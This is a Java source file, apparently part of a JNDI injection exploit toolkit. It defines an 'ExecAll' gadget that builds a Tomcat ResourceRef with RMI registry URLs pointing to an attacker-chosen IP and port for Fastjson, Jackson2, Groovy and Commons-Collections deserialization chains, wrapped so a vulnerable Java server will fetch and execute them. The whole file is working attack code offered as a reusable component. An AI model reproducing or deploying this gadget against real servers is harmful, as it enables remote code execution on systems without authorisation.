package org.gadget;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import org.gadget.inter.Gadget;
import sun.rmi.server.UnicastServerRef;

import javax.naming.StringRefAddr;
import java.lang.reflect.Field;
import java.rmi.server.RemoteObject;

public class ExecAll implements Gadget {

    private ResourceRef ref;
    private String[] gname = {"Fastjson","Jackson2","Groovy","CC4","CC6"};

    public ExecAll(String ip, int port){
        this.ref = new ResourceRef("xxxx", null, "", "", true, "com.sun.jndi.rmi.registry.RegistryContextFactory", null);
        for(String name : gname){
            //必须是RUL，url必须为"rmi:"开头
            ref.add(new StringRefAddr("URL","rmi://"+ip+":"+port+"/"+name));
        }
    }
    @Override
    public Object getObject(String command) throws Exception {


        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

        Field refF = RemoteObject.class.getDeclaredField("ref");
        refF.setAccessible(true);
        refF.set(referenceWrapper, new UnicastServerRef(12345));
        return referenceWrapper;
    }
}
